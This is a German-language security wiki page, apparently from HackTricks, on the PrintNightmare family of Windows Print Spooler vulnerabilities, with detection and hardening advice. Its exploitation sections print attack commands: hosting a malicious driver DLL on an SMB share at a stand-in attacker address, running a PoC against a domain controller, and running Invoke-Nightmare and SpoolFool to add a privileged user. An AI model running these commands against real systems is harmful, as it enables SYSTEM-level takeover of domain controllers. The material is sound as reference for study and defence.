# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare ist der Sammelbegriff für eine Familie von Schwachstellen im Windows **Print Spooler**-Dienst, die **willkürliche Codeausführung als SYSTEM** ermöglichen und, wenn der Spooler über RPC erreichbar ist, **remote code execution (RCE) auf Domänencontrollern und Dateiservern** erlauben. Die am häufigsten ausgenutzten CVEs sind **CVE-2021-1675** (zunächst als LPE klassifiziert) und **CVE-2021-34527** (vollständige RCE). Nachfolgende Probleme wie **CVE-2021-34481 (“Point & Print”)** und **CVE-2022-21999 (“SpoolFool”)** beweisen, dass die Angriffsfläche noch lange nicht geschlossen ist.

---

## 1. Verwundbare Komponenten & CVEs

| Jahr | CVE | Kurzname | Primitive | Anmerkungen |
|------|-----|----------|-----------|-------------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Im Juni 2021 CU gepatcht, aber von CVE-2021-34527 umgangen|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx ermöglicht authentifizierten Benutzern das Laden einer Treiber-DLL von einem Remote-Share|
|2021|CVE-2021-34481|“Point & Print”|LPE|Installation von nicht signierten Treibern durch nicht-Admin-Benutzer|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Willkürliche Verzeichniscreation → DLL-Platzierung – funktioniert nach den Patches von 2021|

Alle missbrauchen eine der **MS-RPRN / MS-PAR RPC-Methoden** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) oder Vertrauensbeziehungen innerhalb von **Point & Print**.

## 2. Ausnutzungstechniken

### 2.1 Kompromittierung des Remote-Domänencontrollers (CVE-2021-34527)

Ein authentifizierter, aber **nicht privilegierter** Domänenbenutzer kann willkürliche DLLs als **NT AUTHORITY\SYSTEM** auf einem Remote-Spooler (häufig der DC) ausführen durch:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Beliebte PoCs sind **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) und Benjamin Delpys `misc::printnightmare / lsa::addsid` Module in **mimikatz**.

### 2.2 Lokale Privilegieneskalation (alle unterstützten Windows, 2021-2024)

Die gleiche API kann **lokal** aufgerufen werden, um einen Treiber von `C:\Windows\System32\spool\drivers\x64\3\` zu laden und SYSTEM-Rechte zu erlangen:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – Umgehung der 2021er Fixes

Die 2021er Patches von Microsoft blockierten das Laden von Remote-Treibern, aber **härteten die Verzeichnisberechtigungen nicht**. SpoolFool missbraucht den `SpoolDirectory`-Parameter, um ein beliebiges Verzeichnis unter `C:\Windows\System32\spool\drivers\` zu erstellen, platziert eine Payload-DLL und zwingt den Spooler, sie zu laden:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Der Exploit funktioniert auf vollständig gepatchten Windows 7 → Windows 11 und Server 2012R2 → 2022 vor den Updates von Februar 2022

---

## 3. Erkennung & Jagd

* **Ereignisprotokolle** – aktivieren Sie die *Microsoft-Windows-PrintService/Operational* und *Admin* Kanäle und achten Sie auf **Ereignis-ID 808** „Der Druckspooler konnte ein Plug-in-Modul nicht laden“ oder auf **RpcAddPrinterDriverEx** Nachrichten.
* **Sysmon** – `Ereignis-ID 7` (Bild geladen) oder `11/23` (Datei schreiben/löschen) innerhalb von `C:\Windows\System32\spool\drivers\*`, wenn der übergeordnete Prozess **spoolsv.exe** ist.
* **Prozessverlauf** – Warnungen, wann immer **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell oder eine nicht signierte Binärdatei startet.

## 4. Minderung & Härtung

1. **Patchen!** – Wenden Sie das neueste kumulative Update auf jedem Windows-Host an, der den Druckspooler-Dienst installiert hat.
2. **Deaktivieren Sie den Spooler, wo er nicht benötigt wird**, insbesondere auf Domänencontrollern:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Blockieren Sie Remoteverbindungen**, während lokale Druckaufträge weiterhin erlaubt sind – Gruppenrichtlinie: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Einschränkung von Point & Print**, sodass nur Administratoren Treiber hinzufügen können, indem Sie den Registrierungswert festlegen:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Detaillierte Anleitung in Microsoft KB5005652

---

## 5. Verwandte Forschung / Tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) Module
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFool Exploit & Bericht
* 0patch Mikropatches für SpoolFool und andere Spooler-Bugs

---

**Weitere Lektüre (extern):** Überprüfen Sie den Blogbeitrag von 2024 – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Referenzen

* Microsoft – *KB5005652: Verwalten des neuen Standardverhaltens bei der Installation von Point & Print-Treibern*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
